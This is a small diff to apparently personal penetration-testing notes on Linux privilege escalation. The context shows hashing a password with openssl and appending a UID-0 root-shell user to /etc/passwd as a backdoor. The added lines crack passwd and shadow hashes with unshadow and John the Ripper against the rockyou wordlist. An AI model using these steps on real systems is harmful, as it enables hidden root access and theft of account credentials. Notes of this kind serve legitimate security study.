@@ -273,6 +273,10 @@ Pattern
                         Syntax: openssl passwd -1 -salt pkong pass123  
                  Put it on the bottom of passwd
                         pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
+                 Once obtain passwd + shadow
+                        unshadow passwd shadow > hash
+                        john --wordlist=/usr/share/wordlists/rockyou.txt hash
+                        
                
                   
                   
